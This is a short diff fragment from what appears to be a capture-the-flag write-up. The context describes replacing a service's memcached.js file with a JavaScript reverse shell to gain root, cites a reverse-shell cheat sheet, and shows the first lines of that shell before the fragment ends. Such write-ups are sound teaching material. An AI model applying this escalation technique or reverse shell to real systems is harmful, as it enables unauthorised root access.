@@ -342,7 +342,8 @@ command = sudo -u nobody /usr/bin/node /home/professor/memcached.js
 If we can somehow replace the memcached.js file with a js reverse shell, we can get a root shell! 
 
 Since we have read write access in this folder, we can move the original memcached.js and .ini file to another folder and replace it with our own malicious memcached.js and .ini file.
-Referencing to https://github.com/cyberheartmi9/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md , we can craft a JS reverse shell script,
+Referencing to 
+https://github.com/cyberheartmi9/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md , we can craft a JS reverse shell script,
 ```
 (function(){
     var net = require("net"),
